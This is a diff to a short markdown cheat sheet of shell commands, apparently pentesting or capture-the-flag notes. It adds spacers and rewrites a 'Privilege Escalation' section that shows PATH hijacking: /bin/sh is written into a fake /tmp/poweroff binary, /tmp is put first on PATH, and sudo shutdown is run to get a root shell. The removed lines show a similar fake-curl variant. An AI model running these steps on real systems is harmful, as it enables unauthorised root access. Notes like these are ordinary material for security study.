@@ -12,6 +12,8 @@ website:
 echo $PATH
 ```
 
+<br />
+
 ## Add text to file
 
 ```sh
@@ -25,15 +27,22 @@ echo "Hello World" > sample.txt
 echo -e "Hello\nWorld" > sample.txt
 ```
 
-## Root privilege
+<br />
+
+## Privilege Escalation
 
 ```sh
-cd /tmp
-echo /bin/sh > curl
-chmod 777 curl
+# option 1
+echo /bin/sh > /tmp/poweroff
+# option 2
+echo /bin/bash > /tmp/poweroff
+
+chmod +x /tmp/poweroff
 export PATH=/tmp:$PATH
 
-# Some SUID command...
+# Some SUID command
+sudo /usr/sbin/shutdown
 
 # Then you are root user
+root>
 ```
